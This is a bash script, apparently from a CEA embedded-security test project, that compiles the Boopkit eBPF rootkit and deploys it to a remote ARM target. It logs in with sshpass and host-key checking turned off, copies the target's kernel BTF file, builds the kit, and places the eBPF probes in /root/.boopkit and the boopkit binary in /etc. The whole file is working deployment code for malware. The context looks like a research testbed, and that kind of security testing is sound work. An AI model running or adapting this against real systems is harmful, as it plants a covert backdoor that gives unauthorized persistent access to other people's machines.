#!/bin/bash
# Copyright (C) 2025 CEA - All Rights Reserved
# 
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
# 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with
# this program.  If not, see <http://www.gnu.org/licenses/>.


# Functions to print error and informational messages
RED="\e[31m"
GREEN="\e[32m"
RESET="\e[0m"

function echo_info {
    local message="$1"
    echo -e "${GREEN}[+] ${message}${RESET}"
}
function echo_error {
    local message="$1"
    echo -e "${RED}[!] Error: ${message}${RESET}" 1>&2
}


# Check if the number of arguments passed to the script is exactly four
if [ $# -ne 4 ]; then
    echo_error "'install_boopkit.sh' script expects exactly 4 argument, but received $#."
    echo "[!] Usage: sudo $0 </path/to/buildroot/output/host/bin> <ip address of target> <ssh username> <ssh password>"
    exit 1
fi


# Variable declarations
echo_info "Starting boopkit installation script..."
SCRIPTDIR="$(realpath "$(dirname "$0")")"
compiler="$1/arm-buildroot-linux-gnueabihf-gcc"
PATH=$PATH:$1
target_ip_address=$2
ssh_user=$3
ssh_password=$4


# Testing SSH connection
# Note: The options "StrictHostKeyChecking=no" and "UserKnownHostsFile=/dev/null" are used to bypass host key verification during connection.
# These options prevent any manual intervention from the user, such as adding or removing the host's public key from the known hosts file.
# The goal is to simplify the installation process as much as possible.
echo_info "Testing SSH connection ..."
sshpass -p "$ssh_password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR "$ssh_user@$target_ip_address"<<EOF
    ls 
    echo "Status command on remote machine : \$?"
EOF
ssh_exit_code=$?
if [ $ssh_exit_code -ne 0 ]; then
    echo_error "Failed to establish SSH connection. Please ensure the host is reachable and that the credentials are valid."
    exit 1
fi


echo_info "The SSH connexion is established."
sshpass -p "$4" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR "$3@$2" date "$(date +"%m%d%H%M%Y")"
if [[ $? -ne 0 ]]; then 
    echo_error "Failed to update the date on the target machine."
    exit 1
fi

BOOPKIT_DIR="$SCRIPTDIR/../../attacks/Boopkit/"
echo_info "Changing directory to boopkit..."
cd "$BOOPKIT_DIR/scripts"
./clone_boopkit.sh 0
if [ $? -ne 0 ]; then
	echo_error "Failed to clone and patch Boopkit."
	exit 1
fi

cd "$BOOPKIT_DIR/boopkit_src"
rm -f vmlinux

echo_info "Retrieving the vmlinux file from the target filesystem..."
sshpass -p "$ssh_password" scp -O -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR "$ssh_user@$target_ip_address:/sys/kernel/btf/vmlinux" .
if [ $? -ne 0 ]; then
    echo_error "Failed to retrieve the vmlinux file from the target filesystem."
    exit 1
fi

if [ ! -f "./vmlinux" ]; then
    echo_error "The vmlinux file was not retrieved via scp. Please check your credentials."
    exit 1
fi


echo_info "Cleaning previous builds..."
make clean 


echo_info "Generating the vmlinux header file..."
bpftool btf dump file ./vmlinux format c > vmlinux.h
if [ $? -ne 0 ]; then
    echo_error "Failed to generate the vmlinux header file."
    exit 1
fi


echo_info "Modifying the vmlinux header file..."
sed -i 's/long int ret;/u32 ret;/g' "./vmlinux.h"
if [ $? -ne 0 ]; then
    echo_error "Failed to modify the vmlinux header file."
    exit 1
fi


echo_info "Launching the compilation process..."
make
if [ $? -ne 0 ]; then
    echo_error "Failed to compile the boopkit."
    exit 1
fi

if [ ! -f "./boopkit" ] || [ ! -f "./pr0be.safe.o" ] || [ ! -f "./pr0be.boop.o" ] || [ ! -f "./pr0be.xdp.o" ] || [ ! -f "./boop/boopkit-boop" ]; then
    echo_error "Error: One or more required binaries are missing after compilation."
    echo -e "[!] Please ensure the following binaries are present :\n- boopkit\n- pr0be.safe.o\n- pr0be.boop.o\n- pr0be.xdp.o\n- boop/boopkit-boop\nCheck the compilation process for any errors."
    exit 1
fi


echo_info "Boopkit compilation finished successfully."
echo_info "Transferring Boopkit to the target..."
sshpass -p "$ssh_password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR "$ssh_user@$target_ip_address" 'mkdir -p /root/.boopkit'
if [ $? -ne 0 ]; then
    echo_error "Failed to create the /root/.boopkit directory on the target."
    exit 1
fi


echo_info "Sending eBPF programs to the target..."
sshpass -p "$ssh_password" scp -O -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR ./pr0be.*.o "$ssh_user@$target_ip_address:/root/.boopkit"
if [ $? -ne 0 ]; then
    echo_error "Failed to transfer pr0be.*.o"
    exit 1
fi


echo_info "Sending boopkit program..."
sshpass -p "$ssh_password" scp -O -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR ./boopkit "$ssh_user@$target_ip_address:/etc"
if [ $? -ne 0 ]; then
    echo_error "Failed to transfer boopkit."
    exit 1
fi


echo_info "Status: 'install_boopkit.sh' script successfully installed Boopkit."
exit 0